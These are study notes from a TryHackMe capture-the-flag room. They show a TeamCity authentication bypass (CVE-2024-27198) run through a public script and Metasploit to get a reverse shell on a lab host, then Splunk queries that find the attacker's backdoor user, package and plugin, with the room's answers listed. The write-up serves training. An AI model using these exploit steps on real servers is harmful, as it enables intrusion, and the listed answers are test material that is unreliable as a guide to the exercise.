# Brains

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

## Red: Exploit the Server!

All brains gathered to build an engineering marvel; however, it seems strangers had found away to get in.
### What is the content of flag.txt in the user's home folder?

## STEP 1: ENUMERATION

```text
nikto 10.10.18.8 // not much given
nmap 10.10.18.8 -sV
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
50000/tcp open ibm-db2? 1 service unrecognized despite returning data.
gobuster dir -u http://10.10.190.85 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.10.190.85 -w /usr/share/wordlists/dirb/common.txt -x .txt
```

## STEP 2: OSINT

```text
http://10.10.18.8:80 // maintenance page
http://10.10.18.8:50000 // log-in page for team city, v: Version 2023.11.3 (build 147512)
http://www.exploit-db.com //
```

- google search: "teamcity 2023.11.3 vulnerabilities"
/CVE-2024-27198 is an authentication bypass vulnerability in the web component of TeamCity that arises from an alternative path issue (CWE-288) and has a CVSS base score of 9.8 (Critical).
- bypass script: https://github.com/yoryio/CVE-2024-27198/blob/main/CVE-2024-27198.py
## EXPOLIT

```text
python jetExp.py -t http://10.10.190.85:50000 -u mynewuser -p mynewpassword // shortened the name of the downloaded exploit file
[+] Version Found: 2023.11.3 (build 147512)
[+] Server vulnerable, returning HTTP 200
[+] New user mynewuser created successfully! Go to http://10.10.190.85:50000/login.html to login with your new credentials :)
```

## TRY METASPLOIT

```text
sudo msfconsole
search 2024-27198
show options
set RHOST 10.10.190.85
set RPORT 50000
set LHOST 10.6.15.233
run
```

// received reverse shell
```text
cd /home && cat flag.txt
```

//answer received
## Blue: Let's Investigate

Now comes the detection part.
The IT department has provided us one of the servers which was compromised as a result of the attack. Our task as a Forensics Analyst is to examine the host and identify the attacker's footprints in the post-exploitation stage.
## Lab Connection

Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP address: MACHINE_IP. The Splunk instance will be accessible in about 5 minutes and can be accessed at MACHINE_IP:8000 using the credentials mentioned below:
## Username: splunk

## Password: analyst123

## Questions and Answers

### What is the name of the backdoor user which was created on the server after exploitation?

```text
index=* useradd
```

- **Answer:** eviluser
### What is the name of the malicious-looking package installed on the server?

```text
sourcetype="packages" installed NOT half
date range on July 4, 2024 // because that is the date eviluser was created
```

- **Answer:** datacollector
### What is the name of the plugin installed on the server after successful exploitation?

```text
index=* plugin
```

- **Answer:** AyzzbuXY.zip
## From <https://tryhackme.com/room/brains>
